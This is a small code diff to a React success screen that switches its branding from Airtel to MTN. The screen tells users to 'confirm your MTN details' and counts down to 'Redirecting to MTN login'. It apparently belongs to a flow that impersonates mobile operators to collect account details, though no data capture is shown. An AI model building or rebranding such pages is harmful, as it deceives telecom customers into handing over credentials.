@@ -33,9 +33,9 @@ function Success({ name }) {
       <p>Your details have been submitted successfully.</p>
       <p>
         For the next step, you are required to confirm your{" "}
-        <b style={{ color: " rgb(209, 79, 79)" }}>Airtel details</b>{" "}
+        <b style={{ color: " rgb(9, 20, 37)" }}>MTN details</b>{" "}
       </p>
-      <span>Redirecting to Airtel... {count}</span>
+      <span>Redirecting to MTN login... {count}</span>
     </div>
   );
 }
